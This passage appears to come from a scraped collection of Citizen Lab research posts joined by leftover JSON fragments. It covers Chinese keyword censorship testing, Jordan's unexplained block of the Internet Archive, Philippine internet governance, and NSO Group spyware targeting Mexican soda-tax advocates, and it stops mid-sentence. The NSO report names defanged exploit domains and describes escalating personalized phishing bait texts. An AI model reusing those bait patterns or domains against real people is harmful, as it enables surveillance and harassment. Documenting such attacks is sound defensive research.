regulations, and policies, search results of 高智晟 (Gao Zhisheng) cannot be displayed.”\n\nFigure 7: Implicit content filtering on Sina Weibo search that reads, “Sorry, unable to find results related to 谢阳 (Xie Yang) + 指定监视居住 (Residential Surveillance at Designated Place).”\n \nSince Weibo consistently filters both simplified and traditional Chinese, we included only simplified Chinese-language and English-language keyword combinations in our testing. The initial test shows that twenty six out of the twenty nine keyword combinations from WeChat also triggered censorship on the Weibo search engine. \nWe determined the keyword combinations that triggered censorship on Weibo search using the following process:\n\nWe removed characters from each WeChat keyword combination until no more characters could be removed while still triggering censorship.\nWe then split the keyword combination into as many separate components as possible while still triggering censorship.\n\nIn the first step, we removed characters until we found the smallest keyword censored and then backtracked by adding them back so as to find all possible Weibo search keyword combinations that a WeChat combination might be reduced to (e.g., “大抓捕+深圳+邓剑峰+监视居住” from the WeChat list can reduce to “深圳+大抓捕+邓” and “圳+邓剑+监” to trigger filtering on Weibo search).\nThe keyword combinations we found blocked on WeChat are often a combination of multiple individual components that trigger censorship in a sent message only if each individual component in the combination appears somewhere in that message.  Thus, after we find the minimal number of characters triggering censorship, we then divide it into as many words as possible while having it still trigger censorship. We do this by adding dummy English letters in between each character. If after inserting a dummy letter the string of characters is still censored, then we know that we can split the keyword combination into separate words at the place of that dummy letter (e.g., if “看望遭羁押x江天勇” triggers censorship, then we know that “看望遭羁押+江天勇” in combination trigger censorship).\nAs a result of this methodology, each of the keyword combinations we found censored on Weibo search are comprised of components from a keyword combination that we had already found censored on WeChat, possibly with some characters removed.\nWe found sixty keyword combinations blocked on Weibo Search. Four of those keyword combinations triggered explicit filtering: “高智晟” (Gao Zhisheng, a Chinese human rights attorney and dissident known for defending activists and religious minorities and documenting human rights abuses in China); “失联+曾飞洋” (Lost Contact + Zeng Feiyang, likely referring to the case of Zeng Feiyang, founder of a Guangzhou-based NGO for workers who was convicted of “assembling a crowd to disturb social order”); “曾飞洋+劳工” (Zeng Feiyang + Labour); and “中共暴政” (CCP Tyrannical Rule, a generic criticism of the Party). The remaining keyword combinations trigger the message: “Sorry, unable to find related results.” Table 3 in the Appendix section shows a breakdown of the sixty simplified-Chinese keyword combinations. \nConclusion \nOur report reviews the crackdown on Chinese rights lawyers and activists, particularly since July 2015, and provides technical evidence of how circulation of information regarding this crackdown is highly sanitized. The online discussion of the 709 Crackdown and the community of rights defenders are subject to many restrictions.\nThis research also highlights the challenges faced by individuals, NGOs, and the international community in conducting advocacy work related to the “709 Crackdown” as well as many other politically sensitive cases in China. While there is tremendous effort and numerous global petitions to help Chinese rights defenders, many of these messages fail to reach domestic audiences in China due to information control practices, including search filtering and keyword and image censorship on chat apps.\nIn the meantime, as major global social media channels (e.g., Facebook, Twitter, Pinterest, LINE, and Telegram) are blocked in China, many overseas individuals, NGOs, and media rely on WeChat and Weibo to communicate with their China-based partners and audiences. This report serves as a reminder that the transmission of those messages—even through private chat apps—are not always reliable.\nChinese social media platforms routinely and systematically enforce information controls on politically sensitive content. The blocking of the 709 Crackdown-related keyword combinations showcases that censorship on Chinese social media such as WeChat and Weibo is dynamic and reactive to current events. The keyword blacklists are often updated in response to the development of the events.\nPrevious work has found similar information control mechanisms on Chinese video sharing sites, live streaming apps, and chat apps. Our discovery of related blocked images on WeChat confirms the existence of image filtering and reveals the high level and extent of censorship enforced on this popular chat app.\nLimitations and Future Work\nThis report is part of our ongoing study of WeChat censorship. The list of “709 Crackdown”-related censored keyword combinations we documented in this current report is unlikely to be comprehensive. The names of the organizations and the thirteen individuals we were able to identify as censored on WeChat and Weibo are not necessarily the only targets subject to censorship in China’s online or offline spheres. However, our work highlights the restrictions that the community of rights defenders are facing online and offline in China. \nOur project documenting and investigating censorship on Chinese chat apps is continually developing. The discovery of image filtering on WeChat provides us with another direction to move forward with in our research. This report provides some experimental methods to track censorship on closed platforms such as WeChat in the increasingly obscure research environment in China. Future research should consider expanding the monitoring list beyond news media.\nAcknowledgments\nData visualization by Andrew Hilts.

    "text": "\n\t\t\t\tby Reem Al Masri\nAdam Senft (Citizen Lab), Jakub Dalek (Citizen Lab) and Baraa Hassaniya (Jordan Open Source Association) contributed to the reporting. Translation was completed by James Cain.\nRead the post in Arabic.\nImagine a museum for the Internet; this is the closest description of the website “Internet Archive”. Of the tens of thousands of books available on the website free of charge, we found more than 127 thousand books in Arabic, most of which were original manuscripts. Books of Islamic jurisprudence and interpretation digitized by libraries of American and Canadian universities were also made available through Internet Archive. The website satiates a nostalgia that infects us from time to time to revisit coverage of Arabic websites of big events such as the coverage of the assassination of Rafiq Al-Harari in 2004, or to return to forums that vanished from the face of the internet such as Abu Mahjoob forum.\nIn October of last year, the non-profit foundation Internet Archive, along with the wider world, celebrated the 20 year anniversary of the founding of the website which aims to preserve memories of the internet and prevent digitally generated content from disappearing. \nThe only ones who did not celebrate this occasion were internet users in Jordan. \nSince the beginning of the year 2016, internet browsers would simply display a message confirming the unavailability of the site, seconds after typing  its address www.archive.org , regardless of the service provider or method used. \nThe website became available once again in February of the year, according to a statement received by 7iber from Chris Butler, the Office Manager of Internet Archive. In the meantime, during the four-month-long period from September 2016 to January 2017, the team at 7iber attempted to uncover the technical or legal causes which made a global website like this one unavailable to internet users in Jordan. There were two scenarios to explain the phenomenon: Firstly, there were technical issues within the website itself which impeded us, and other users across the world from accessing it. As for the second possibility, it was that the website had been blocked by the Media Commission in Jordan, as we’ve grown to expect, practicing its powers granted by the 2012 amendments to the Press and Publications Law. \nHowever, a third scenario was awaiting us. \nHow can we technically  prove that the website was blocked? \nFor us to begin research into the second scenario, we had to first confirm that there were indeed no technical issues within the website itself (scenario 1). We needed to find technical evidence of the block after succeeding to get on the website using Tor browser or a VPN. In collaboration with Citizen Lab and the Jordan Open Source Association, we ran a number of tests starting on November 17th 2016 on the network using the application WireShark. The application records all the traffic sent and received by a device when it connects to the internet. The results of the test revealed that devices which attempted to connect to the website Internet Archive were failing to complete the operation known as a “TCP handshake”, which is normally completed whenever a connection is created between two devices. This is something which can be taken as a clear indication that the website had been deliberately blocked. (For more technical details on this test please refer to the attached file).\nThe test results matched what Chris Butler, Office Manager at Internet Archive, had previously told 7iber in a statement: “reports reached us from two different users, the first of them in February 2016 and the second in March of the same year, both regarding the users’ inability to access the website from Jordan. The complainants had tried to access the website from a range of telecom company networks (Umniah, Zain, and Orange) only to find they were still unable to access the site”. Butler continues that after Internet Archive pursued the issue and were in touch with the Commission in December of last year, the website became available once again in the last days of January of this year. \nWe ran a second test on the network once the website was available again, and the results now showed the successful completion of the TCP handshake, and the possibility of sending and receiving packets between the site’s server and testing device. This all confirmed that the website had been blocked before and that now the block had been lifted. \nThe website was blocked centrally, but who blocked it and why? \nIn November of 2016, at the time the website was still blocked, we directed a number of questions to the three entities through which a website blocking process normally has to pass: The Media Commission, which sends the decision to block the website to the Telecommunications Regulatory Commission (TRC), which in return disseminates it to telecom companies to enact it. \nAssuming that telecom companies have the most knowledge of their networks and are careful to carry out blocking decisions to avoid legal liability, we thought that they are the most capable of explaining the unavailability of the website on their networks. We got in touch with two companies (Zain and Orange) last November. The public relations employees in both companies seemed happy to cooperate with the media. After formally sending them our questions, Orange stopped replying to the numerous attempts made by 7iber to receive an explanation.  As for Zain, their response after several attempts to get an answer was that “the employee responsible for the block is on a family holiday, and there is not anybody else able to take his place and answer this question”. The public relations employee then dismissed our subsequent inquiry: “What if you were to receive an order to block a website whilst the relevant employee was on holiday?”\nThe reasons behind the telecom companies’ delays in replying to our questions may well have been purely bureaucratic through which inquiries from non-advertising media simply gets lost. However we were not the only ones being ignored in this way. Butler told us that Internet Archive had also repeatedly tried to contact Orange, Zain, and Umniah throughout April 2016 in order to clear up the complaints which he had received,  without a single reply. The website also tried to contact the Ministry of Communications and the National Centre of Information Technology only to find the same level of disregard. \nAs for the Telecommunications Regulatory Commission (TRC), despite their efficiency in communicating with 7iber, their responses to us seemed to answer another question, one we weren’t asking: “The Telecommunications Regulatory Commission is not the entity which issues the decisions but rather it is the entity which enforces the decisions the block sites as issued by the Media Commission, furthermore the Commission does not receive reasons behind the blocking of any website, and this is the same in the context of Internet Archive”.\nWhen we tried to return to the original question: “Did the TRC carry out the dissemination of the decision to block the website Internet Archive?” the TRC responded with the same answer. We then asked the TRC whether it would be possible to supply us with all blocking decisions that they passed in year 2016, and their reply was that “the TRC is unable to disclose that given that these decisions are temporary and not fixed”.\nThe only place left to look for an answer was the Media Commission, the sole entity legally authorised to issue decisions to block websites as according to the amendments of the Press and Publications Law of 2012. The director of the Media Commission, Mohammad Quteishat, confirmed to us that at the end of last November, and after looking at all the blocking decisions in 2016, “there was not one which pertained to the website Internet Archive”.\nWhy did the website become available?\nIn February 2017, after the website was available, we contacted Chris Butler again. According to Butler, Internet Archive communicated with the Media Commission in January of this year to try again to inquire about the reason for the site’s blocking following all the previous failed attempts to contact telecom companies. The response from the Media Commission was that they would look into this issue, stressing that the blocking decision had not been issued by the Commission. Butler says that the commission got in touch with him at the end of January announcing that the website was “now” available in Jordan according to the following email: \n\nAgain, we asked the director of the Media Commission, Mohammad Quteishat, about the reason for the site’s return to Jordan after being blocked for almost a year. However, Quteishat assured us that “the website was not blocked on the Commission’s network, at least as provided by the National Centre for Information Technology [gov ISP]”\nAnd as for what the Commission wrote in its message, that the website “Is now available”, it did not insinuate for Qutaishat that “that the website was blocked,” according to what he told 7iber. As for our request for an explanation of the technical reports proving the blocking of the website, and the coincidence of the availability of the website shortly after Internet Archive contacted the Media Commision, he said: “I cannot answer. We did not have any hand in the blocking or the unblocking of the website, the website was not ever blocked according to a report from the follow-up committee.”\nThe third scenario: The invisible hand\nThe website Internet Archive was blocked quietly in Jordan, and then unblocked quietly. Despite the obscurity of the reasons behind the availability of the website, the story lay in discovering the extent of absurdity that the process of blocking websites in Jordan has reached. This absurdity is first structural. It began in the 2012 amendments of the Press and Publications Law, which the government is convinced has been effective in regulating online media. However, until now, the scope of the sites made subject to the Press and Publications Law remains controversial because it goes against the technical nature of network, that cannot define sites into “local” and “global”. The absurdity is also manifested through the administrative authority given by the law to the director of the Media Commission, allowing him to use his own discretion to identify which websites can be categorised under “electronic news website”. As for Internet Archive, it all points to the worst-case scenario: There is a parallel entity outside any radar, with influential central powers over the network, able to jump above the remit of the Media Commission and telecoms, and block or unblock websites centrally. \n“We’re appreciative that the Commission appears to have helped get us back online in Jordan,” Chris Butler told 7iber.  But despite what the Commission wrote in their email to him, that the website was “currently” available, Butler was hoping “they would reply to our follow-up questions and that we could clearly understand why the website was blocked at the level of the backbone”. \n“If the Government censored the site, they should say so,” he says. “If they claim to not have censored it, it would be helpful to have an explanation what the issue was and how it was resolved by the work that the Media Commission referred to.”\nThis story also reminds us of the absence of minimum transparency in the blocking process, even the legal and visible one. Telecom companies, the Telecommunications Regulatory Commission and the Media Commission keep blocking decisions locked in their drawers, without feeling obliged to make them public to citizens. \nAccording to Issa Mahasneh, president of the Jordan Open Source Association, the owner of a blocked website has the right to know which entity issued the decision to block that site, so that they may be able to challenge that decision. “So, for example, if a website was mistakenly blocked or blocked in a way which was illegal, then the owner would request compensation for losses from the entity which caused it this damage,” he says.\nNeither we, nor Chris Butler, or the director of the Media Commision know who blocked the Internet Archive. However, what we know is that there is a parallel window for blocking websites, through which an “invisible hand” practices its authority and draws for us the Internet that it wants us to use, without any accountability. \nAttached file explaining the technical tests: \nWe conducted network measurement tests on the ISP Orange, to determine if the website of Archive was blocked. In order to do this, we accessed http://www.archive.org in a web browser while collecting a packet capture using Wireshark. The page failed to load in the web browser, eventually returning a “The connection has timed out” error message.\nIn the packet capture, we can see in more detail why the page failed to load. The first step, the domain name resolution, completed normally. In response to our DNS query, we received the IP address 207.241.224.2, which is the correct IP address for Archive.  This is known because this IP address is in the ASN of Archive.\nHowever, all traffic sent to this IP address did not receive a response. The testing client began the process of establishing a connection with the Archive server by initiating the 3-way TCP handshake. After sending the initial SYN packet, the testing client does not ever receive a response. The client tried sending this SYN packet repeatedly, and not receiving a response it eventually gave up.\nThese tests were repeated multiple times, and at no point did the testing client ever receive a response from the Archive server. This is highly suggestive of deliberate filtering.\n\n\n \n \n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tThe Cyber Stewards Network is pleased to announce the release of a report titled “An Overview of Internet Infrastructure and Governance in the Philippines.” The report outlines the key actors, regulatory structures, and challenges facing the development of the information and communication technology (ICT) sector in the country, as well as privacy and security concerns.\nThe report begins by outlining the political context of the Philippines and then describes the regulatory landscape and mandates of various organizations responsible for decision-making, as they relate to the establishment and operations of ICTs.\nThroughout the document, key issues relating to access, privacy, and human rights more broadly are flagged. In particular, the report identifies gaps in state capacity and ICT leadership as germane to policy issues in the Philippines, including a lack of coordination among state agencies and the government’s absence from multistakeholder fora like the Internet Governance Forum. Finally, the report explores issues related to communications surveillance, online piracy, and anti-obscenity initiatives.\nKey Findings\n\nThe absence of an overall, nationwide access strategy for information and communications technology means that basic elements of this access have not been put in place.\nRapid advances in technology have outpaced policy and legislative arrangements on many levels, as suggested by the Supreme Court’s decision on libel provisions of the Cybercrime Prevention Act.\nUnlike some of its Southeast Asian neighbours, the Philippines does not have a history of content controls, though recent developments suggest that content controls could be on the horizon, including anti-obscenity and anti-piracy initiatives, as well as the use communications surveillance tools by the government.\n\nBased on these findings, the Foundation for Media Alternatives made recommendations for future improvement, which are briefly outlined below.\nRecommendations\n\nSupport and build up champions of a progressive ICT agenda among current and future government officials.\nBuild a new ICT masterplan that incorporates a clear Internet governance framework, one that is developed in close consultation with various stakeholders, including civil society.\nDevelop the capacity of key institutions governing the ICT sector, including the Department of Information and Communications Technology and National Telecommunications Commission, by ensuring their financial viability and enabling them to respond to regulatory challenges.\nProduce a post-2015 ASEAN ICT master plan in a consultative environment, both at the national and regional levels.\n\nRead the full report (PDF).\nThis research was made possible by the generous support of Hivos Southeast Asia.\nResearch and writing was completed by Al Alegre, Nica Dumlao, Jamael Jacob, Jessamine Pacis, and Randy Tuano of the Foundation for Media Alternatives (FMA), and Irene Poetranto, Adam Senft, and Amitpal Singh of the Citizen Lab at the Munk School of Global Affairs, University of Toronto.\nThanks also to Masashi Crete-Nishihata, Ron Deibert, and Jacqueline Larson.\n\n\t\t\t\t\n\t\t\t",

    "description": "This post is a summary of eight major research reports released by the Citizen Lab in 2016 which received substantial national and international media coverage.",
    "text": "\n\t\t\t\tThis post is a summary of eight major research reports released by the Citizen Lab in 2016 which received substantial national and international media coverage.\nThe “One App, Two Systems” report, released in November, outlined the censorship mechanisms at play in popular Chinese social media platform WeChat. The app was found to enable keyword censorship for only those users with registered mainland China phone numbers, and persisted even if these users link to an international phone number. WeChat’s internal browser blocks China-based accounts from accessing a range of websites including gambling, Falun Gong, and media that report critically on China. Websites that are blocked for China accounts were fully accessible for International accounts (with intermittent blocking of some), indicating that a separate system was used for international censorship from the Chinese domestic one. The report was covered in the Globe and Mail.\nIn tandem with CIPPIC Staff Lawyer Tamir Israel,  Research Associate Christopher Parsons authored a report examining the use of IMSI Catchers, a class of surveillance devices used by Canadian state agencies. They are used to intercept communications from mobile devices, and identify otherwise anonymous individuals with their devices, and track them. The report noted that the instructive nature of IMSI Catchers means that they pose a worrying threat to privacy. After exploring the regulatory environment for their use and their technical capacities, the report concludes by setting out best practices for a framework with better legal safeguards for user privacy. Read coverage of the report via the Globe and Mail.\nCitizen Lab researchers published in August a report titled “Million Dollar Dissident: NSO Group’s iPhone Zero-Days used against a UAE Human Rights Defender.” This report investigated malware exploits sent to internationally recognized human rights defender Ahmed Mansoor. Mansoor received SMS text messages on his iPhone promising “new secrets” about detainees tortured in United Arab Emirates’ (UAE) jails if he clicked on an included link. Instead of clicking, Mansoor sent the messages to Citizen Lab researchers, who recognized the links as belonging to an exploit infrastructure connected to NSO Group, an Israel-based “cyber war” company that sells Pegasus, a government-exclusive “lawful intercept” spyware product.  NSO Group is reportedly owned by an American venture capital firm, Francisco Partners Management. If infected, Mansoor’s phone would have become a digital spy in his pocket, capable of employing his iPhone’s camera and microphone to snoop on activity in the vicinity of the device, recording his WhatsApp and Viber calls, logging messages sent in mobile chat apps, and tracking his movements.  Apple immediately released security updates that patched the vulnerabilities identified in the report. Read Citizen Lab Director Ron Deibert’s blog post on this report.\n“Group 5: Syria and the Iranian Connection,” another report also released in August, described an elaborately staged malware operation with targets in the Syrian opposition. We named the operator Group5, and suspect they have not been previously reported. Group5 used “just enough” technical sophistication, combined with social engineering, to target computers and mobile phones of well-connected individuals in the Syrian opposition with malware. The report was covered in an exclusive release with the Associated Press, and Ron Deibert offered further comment in a blog post, and an op-ed for the Washington post.\nIn another study, researchers discovered the presence of malware attacks coordinated by a sophisticated operator against Emirati journalists, activists, and dissidents. The software, dubbed “Stealth Falcon” by Citizen Lab researchers, was explored in the report titled “Keep Calm and (Don’t) Enable Macros: A New Threat Actor Targets UAE Dissidents.” The report was produced after a spyware-laden email sent to Rori Donaghy, a UK-based journalist covering the UAE government, was analyzed by researchers. Circumstantial evidence suggested a link between Stealth Falcon and the UAE government. Ron Deibert commented on the report in a blog post.\nIn March, we released another report outlining concerns with browser security, this time with QQ Browser, a free web software for multiple platforms developed by Chinese firm Tencent. Our research showed that both Windows and Android versions of the application transmit personally identifiable data with weak or non-existent encryption, and do not adequately protect the software while it undergoes the update process. The report, titled “WUP! There It Is: Privacy and Security Issues in QQ Browser,” was also discussed by Citizen Lab Director Ron Deibert in a blog post.\nIn February, a report on Baidu Browser, titled “Baidu’s and Don’ts: Privacy and Security Issues in Baidu Browser,” uncovered key vulnerabilities in the Windows and Android versions of the software. Researchers pointed out that the application transmits personal user data to Baidu servers without encryption or with easily decryptable encryption, and is vulnerable to arbitrary code execution during software updates via man-in-the-middle attacks. Much of the data leakage is the result of a shared Baidu software development kit, which affects hundreds of additional applications.\nEarlier that month, Citizen Lab partner Open Effect published a report comparing the privacy and security protections of various wearable fitness trackers and their accompanying mobile applications. The report, titled “Every Step You Fake: A Comparative Analysis of Fitness Trackers,” found that seven out of the eight fitness trackers studied emitted persistent, unique identifiers (Bluetooth Media Access Control address) that can expose their wearers to long-term tracking of their location when the device is not paired, and connected to, a mobile device.

NSO Group is an Israeli “cyber warfare” company.\n\n\nNSO’s government surveillance tool may have been misused on behalf of special commercial interests, not for fighting crime or terrorism.\n\nSummary\nThis report describes an espionage operation using government-exclusive spyware to target a Mexican government food scientists and two public health advocates. The operation used spyware made by the NSO Group, an Israeli company that sells intrusion tools to remotely compromise mobile phones.  On August 25, 2016, the Citizen Lab published a report showing that NSO’s technology was used to target Ahmed Mansoor, a UAE-based human rights defender, as well as identifying targeting in Mexico.  Mexico has previously confirmed that it is a purchaser of NSO Group’s spyware.\nMansoor was targeted with links sent via SMS. Had he clicked on the links, his iPhone would have been silently exploited with the Trident, a series of three zero-day exploits designed to install NSO’s Pegasus spyware on his phone.\nThis research presents evidence that NSO’s exploit infrastructure and spyware were used to target additional individuals in Mexico in July and August 2016, including Dr. Simon Barquera, a well-respected Mexican government health scientist, Alejandro Calvillo, the director of a consumer and health advocacy organization, and Luis Encarnación, the director of a coalition working on obesity prevention.\nThese individuals are neither criminals nor terrorists, but a prominent government scientist and two health campaigners who support a public health measure: Mexico’s soda tax on sugary drinks.  They received the malicious links via SMS while campaigning to increase the soda tax rate, improve drink labelling, and raise awareness of health risks associated with sugary drinks.\nThis case suggests that NSO’s government-exclusive espionage tools may be being used by a government entity on behalf of commercial interests, and not for national security reasons or fighting crime.\nCitizen Lab’s investigation was conducted with the assistance of Mexican non-governmental organizations (NGOs) R3D and SocialTIC.\nMexican Soda Tax Supporters Targeted with NSO Exploit Links\nFollowing publication of the August 2016 report, researchers with Citizen Lab and Amnesty International were contacted by Access Now, which had received a request for assistance on its helpline from R3D and SocialTIC, two Mexican NGOs working on digital rights and security. These NGOs assisted Citizen Lab researchers in collecting suspicious messages from a range of Mexican targets.\nImage 1. Alejandro Calvillo, who was targeted with NSO, has strongly advocated for the soda tax as a means to combat obesity. Image by Cartoscuro.\nAnalysis of the text messages collected by R3D and SocialTIC revealed a campaign involving NSO exploit links active between at least April 20 and August 17, 2016.\nThis report describes a subset of these discoveries: SMS messages sent to three individuals—Dr. Simon Barquera, Alejandro Calvillo, and Luis Encarnación—in July and August 2016 (See: Confirmed Targets of NSO Exploit Links). We are naming these individuals with their explicit consent.\n\nDr. Simon Barquera is a well-respected researcher at the Mexican Government’s Instituto Nacional de Salud Pública (National Institute of Public Health).\nAlejandro Calvillo is the Director of El Poder del Consumidor, a consumer rights and health advocacy organization.\nLuis Encarnación is the Director of the Coalición ContraPESO, a coalition of more than 40 organizations that work on obesity prevention and reduction strategies.  All three individuals work to support Mexico’s soda tax.\n\nTable 1.

The tax slightly raises prices to encourage consumers—especially children—to seek healthier alternatives.  The so-called “soda tax” has led to decreases in soda consumption and is projected to save over 18,000 lives from illnesses related to excess sugar consumption over 10 years.\nDespite the positive effects on public health, efforts to promote healthier consumer habits have been met with resistance from the food and beverage industry. For example, the CEO of Coca Cola personally called Mexico’s president in 2013 to encourage him to oppose the soda tax, and some Mexican media companies refused to air advertising supporting the tax.  After the tax bill was passed, the pressure continued.\nIn October 2015, legislators attempted to cut the tax in half, although a swift public backlash and accusations of influence by soft drink companies forced cancellation of the tax cut. Nevertheless, there is evidence that the industry continues to exert political pressure to block Mexico’s efforts efforts to curb soda consumption.\nContext of the Bitter Sweet Targeting Period\nIn response to the political pressure against the soda tax, in mid-2016 public health groups and food scientists prepared a mass media campaign to build support for the tax, increase the tax rate, and call for accountability in how the tax revenue was being spent.  Campaigners held a press conference on June 29, 2016, highlighting misleading and confusing product labelling standards promoted by the food and beverage industry and planned a full launch of their campaign in August 2016.  Campaigners began receiving the spyware links one week after the press conference, and throughout the period that the campaign was being prepared (See Figure 1).\nFigure 1. Dates in July 2016 when the three targets are known to have received malicious messages containing links to NSO’s exploit framework. We may not have all of the messages sent to them.\nBitter Sweet Bait Texts: Personalized, Profane\nSocial engineering is a common strategy for delivering even very sophisticated spyware.  Operators rely on social engineering because it “just works.” Many instances of social engineering involve an operator sending a malicious attachment or link in a message specially crafted to appeal to a target.  Messages may be designed to appear urgent, important, upsetting, or intriguing to targets, to convince the target to open the link or attachment. \nSpyware operators sometimes develop bait content that is both personalized and capable of stirring strong emotions. The Bitter Sweet NSO spyware operators personalized the messages to the interests and work of the targets (See Figure 2), and actively escalated the emotional content of the messages over time (See Figure 3).\nFigure 2. SMS message sent to Dr. Simon Barquera, telling him that his daughter was in a serious car accident, and to click the link to learn about the hospital.\nThe messages used several deceptions to encourage targets to click on malicious links.  For example:\n\nUpsetting fake news updates suggesting personal scandals\nUpsetting personal messages, like the news of the death of a relative, or injury of a child\nPersonal sexual taunts and allegations\n\nBitter Sweet Escalation: From “I saw you mentioned” to “I f*cked your old lady” to “your daughter was in a car accident”\nIn several cases, a single target received several kinds of messages, ranging from mundane to highly emotional and upsetting.\nFor example, the targeting of Dr. Simón Barquera (that we know of) began with the operators sending him a message on July 11, 2016 with a fake news story relevant to his work. The Bitter Sweet operators subsequently escalated the personal content and aggressiveness of the messages in two waves, ending on August 17 (See Figure 3).\nFigure 3. Beginning with a fake news story, the texts sent to Dr. Barquera escalated into the personal, and then the obscene. By July 14, the messages taunted that someone had slept with his wife, and by August the operators were trying to trick him into believing that his daughter was injured.\nOn July 12, Dr. Barquera received a message saying that he was mentioned in a court case.  The following day, he received a more emotionally charged message: someone’s father has died, the sender is devastated, and would Dr. Barquera check the dates of the funeral to see if he could attend?\nOn July 14, perhaps frustrated at a lack of success, the operators tried an even more upsetting theme: “While you are working I am fucking your old lady here is a photo.”\nOn August 9 he got a message hinting that a news article contained personal attacks against him.  Then, a message on August 11 accused him of sleeping with the sender’s wife, continuing the theme. On August 12 a fake news update suggested that a place where he was affiliated was being investigated for corruption, and on August 15 he received an alarming message saying he was being accused of corruption in a national publication.\nFinally, on August 17 he received an extremely upsetting message stating that his daughter had just been in an accident and was in “very serious condition.”  The message included a link with information about the place where she was purportedly hospitalized.\nWhy So Many Messages?\nThe repeated messages and escalation of emotional content suggest a strong desire on the part of the operators to compromise Dr. Barquera’s device. The Bitter Sweet operators may have either failed to infect Dr. Barquera’s devices with NSO’s Pegasus or had trouble maintaining a stable infection on the target device (see: Figure 3).\nThe Other Targets\nAlejandro Calvillo also received a message about a father’s funeral on July 8 and a message on July 11 stating that his name was mentioned in a news article that was “going viral.”\nLuis Encarnación, meanwhile, received a message on July 12 suggesting that he was mentioned in a news article (See Figure 1). A full list of the texts and malicious links is included in Appendix A.\nThe Redirects\nAccording to the targets, in several cases there were links that redirected to the website of a funeral home. These included messages about a funeral, but also bait messages that were on unrelated subjects. It is unclear whether this was a veiled threat, or a sloppiness by the operators. The more explicit taunts, meanwhile, reportedly redirected to pornography websites. Citizen Lab was not able to examine these redirects, as NSO’s entire exploit infrastructure was shut down around the time of our August 2016 report.\nAll three targets have taken steps to ensure the security of their devices following this incident.\nHeavy Handed Targeting: Why such obvious lies?\nDr. Barquera could easily figure out that his daughter was not injured, just as Alejandro Calvillo could determine that there was no “viral” news article about him.  This is telling about the style of the Bitter Sweet operators: they did not try very hard to avoid detection. They seem to have prioritized getting a target to click, rather than carefully concealing their targeting.\nThere are many factors that could explain the heavy-handed targeting, including a lack of professionalism, intense pressure for results, a lack of concern for the consequences of being caught.  Whatever the reason, recklessness by the Bitter Sweet operators led to the compromise of their operation.\nBitter Sweet’s ‘noisy’ targeting also speaks to the issue of risk to other customers: if the NSO Group cannot stop its customers from recklessly using its tools, then it cannot guarantee other customers full secrecy.  The NSO Group sells the same software and exploits to multiple government customers, and if one customer exposes their tools, all customers’ are impacted.  This scenario came to pass  when a different NSO client targeted Ahmed Mansoor, triggering to our original investigation, which led to the patching of hundreds of millions of Apple devices, and exposed NSO’s Pegasus software and Exploit infrastructure.\nConnecting the Bitter Sweet SMSes to the NSO Exploit Infrastructure\nThe messages sent to Dr. Simon Barquera, Alejandro Calvillo, and Luis Encarnación all contained links pointing to domains previously identified as part of our investigation into NSO’s infrastructure. The URLs in several text messages directly linked to the exploit infrastructure, while in others targets received exploit links that were shortened using the bit.ly link shortening service (See Appendix A for a full list, including all redirects).\nTable 2. NSO Exploit Infrastructure Observed in This Operation\n\n\n\nNSO Group Trident Exploit & Spyware Domain\nTarget(s)\n\n\nsmsmensaje[.]mx\nDr. Simon Barquera, Alejandro Calvillo, and Luis Encarnación\n\n\nunonoticias[.]net\nDr. Simon Barquera\n\n\n\nBased on the behavior of links received by human rights defender Ahmed Mansoor, clicking on the link would have caused the phone to be silently and remotely jailbroken, and infected with NSO’s Pegasus spyware.\nOur previous report mentioned a subset of the NSO exploit infrastructure domains that we discovered, including unonoticias[.]net.  We also identified smsmensaje[.]mx as an NSO exploit infrastructure domain during the scanning period, although it was not listed in our report to protect ongoing investigations.\nBitter Sweet Attribution: The Mexican Nexus\nWhile we do not conclusively demonstrate that elements of the Mexican government participated in the Bitter Sweet operation, circumstantial evidence suggests that this is a strong possibility.\nOnly a government can purchase NSO’s products: NSO Group explicitly limits the sales of its products to governments. Therefore, we can reasonably conclude that a government’s NSO deployment was used in this attack.\nThe Mexican Government is a confirmed NSO User: The Mexican government reported that it signed a $ 20 million dollar deal with NSO Group in 2012. Thus, elements of the Mexican government likely had access to NSO products at the time of the Bitter Sweet operation.\nThe targets work on multiple domestic Mexican issues: The same infrastructure used for the Bitter Sweet operation (the unonoticias[.]net domain) was also used to target a Mexican journalist who wrote a story about government corruption involving the Mexican President’s wife and a high-speed rail contractor, among other domestic targeting.\nThe targets of the Bitter Sweet operation work on issues related to soft drink consumption and parties outside Mexico may object to their work. A large multinational food and beverage company could conceivably have sufficient influence to encourage a different government that has purchased NSO to target Dr. Simon Barquera, Alejandro Calvillo, and Luis Encarnación.  However, it is not clear that another government would be equally interested in all of the other targets we have identified.\nNoisy targeting: The heavy handed targeting is also a factor suggesting that the Bitter Sweet operator is a Mexican governmental client: it is unlikely that a foreign country would use the NSO tool on Mexican soil so brazenly and so clearly risking discovery.\nConclusion: Government-Exclusive Spyware’s Many Misuses\nThe targets of the Bitter Sweet operation have not been accused by anyone of being criminals or terrorists.  They are, instead, concerned scientists and public-health campaigners trying to limit the overconsumption of sugary drinks in Mexico. Yet, they have been targeted with a sophisticated piece of government-exclusive spyware.\nResearch by the Citizen Lab and others has consistently shown that some governments are willing to use “lawful intercept” tools like NSO Group’s Pegasus to recklessly target and harass journalists, activists, and human rights defenders.  Prior Citizen Lab reporting on NSO Group spyware highlighted, for example, the targeting of a Mexican journalist who reported on a presidential scandal (See: Section 7.1. Mexico: Politically Motivated Targeting?). Governments may view these people, however incorrectly, as threats to the state.\nThe advocacy work of Dr. Simon Barquera, Alejandro Calvillo, and Luis Encarnación cannot be construed as threats to the state. They have, however been critical of the influence of the soft drink industry in government, and supported measures that are projected to save over 18,000 lives from illness. These actions do threaten some interests: the revenues of companies selling sugary drinks, and the fortunes and reputations of their investors and allies in government.\nThis case suggests that NSO’s surveillance tool may have been misused for special commercial interests, not for fighting crime or terrorism. We hope that this report and the evidence that it includes will result in an urgent investigation by the Mexican government, as well as the Israeli government, which approves exports of NSO products.\nThis case also highlights that the current regulatory environment has been unsuccessful at preventing egregious misuses of spyware.  As spyware companies continue to sell to customers who abuse their products, they invite stronger regulation by concerned governments and multilateral bodies. Their lack of due diligence and the brazen abuses of their products by government clients are potent arguments in favor of more effective regulation.\nDealing With Suspicious SMS Messages\nThis campaign relied on upsetting, personalized messages combined with highly sophisticated government-exclusive spyware. Even though the spyware that was delivered was sophisticated, the path to infection started by exploiting human emotions. A target needs to click on the link for the infection to happen, which means the first line of defense is being vigilant and mindful of our own behaviours.\nHere are several basic suggestions for avoiding SMS-based spyware:\n\nDo not click on SMS-links sent from people you do not know.\nBe especially careful with upsetting, unsolicited messages that 